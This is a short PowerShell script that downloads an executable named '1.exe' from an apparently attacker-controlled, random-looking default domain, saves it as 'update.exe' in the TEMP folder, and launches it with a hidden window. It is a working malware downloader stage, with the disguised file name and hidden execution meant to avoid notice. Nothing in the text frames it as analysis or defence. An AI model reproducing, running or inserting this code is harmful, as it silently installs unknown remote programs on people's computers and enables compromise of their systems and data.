param($domain)

if (-not $domain) {
    $domain = "zxjasjkask1992.sbs"
}

$exeUrl = "https://$domain/1.exe"
$exePath = "$env:TEMP\update.exe"
(New-Object System.Net.WebClient).DownloadFile($exeUrl, $exePath)
Start-Process -WindowStyle Hidden $exePath
